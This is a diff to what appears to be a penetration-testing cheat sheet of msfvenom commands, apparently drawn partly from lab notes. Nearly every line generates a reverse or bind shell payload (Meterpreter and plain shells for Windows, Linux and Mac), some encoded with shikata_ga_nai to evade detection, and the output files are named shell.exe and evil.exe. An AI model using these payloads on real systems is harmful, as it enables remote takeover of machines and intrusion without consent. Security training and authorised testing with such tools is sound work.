@@ -15,13 +15,20 @@ Linux Bind Shell
 msfvenom -p generic/shell_bind_tcp RHOST=<Remote IP Address> LPORT=<Local Port> -f elf > term.elf
 
 Windows Meterpreter Reverse TCP Shell
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f exe > shell.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<RETURN_IP> LPORT=<RETURN_PORT> -f exe > shell.exe
 
 Windows Reverse TCP Shell
 msfvenom -p windows/shell/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f exe > shell.exe
 
-Windows Encoded Meterpreter Windows Reverse Shell
-msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
+#1  ==========    From labs    (32 bit <TARGET> ) ==========
+#> msfvenom -p windows/shell/reverse_tcp -a x86 -e x86/shikata_ga_nai -f exe LHOST=<RETURN_IP> LPORT=<RETRUN_PORT> > evil.exe
+
+#2  ==========    Windows Shellcode with SHIKATA-GA-NAI  (32 bit <TARGET> )  ==========
+#> msfvenom -p windows/shell/reverse_tcp LHOST=<RETURN_IP> LPORT=<RETURN_PORT> -f c -e x86/shikata_ga_nai -b "\x00" > test.exe
+# https://www.youtube.com/watch?v=nNt_gRl8RBk
+
+Windows Encoded Meterpreter Windows Reverse Shell (32 bit <TARGET> )
+#> msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 3 -f exe > encoded.exe
 
 Mac Reverse Shell
 msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f macho > shell.macho
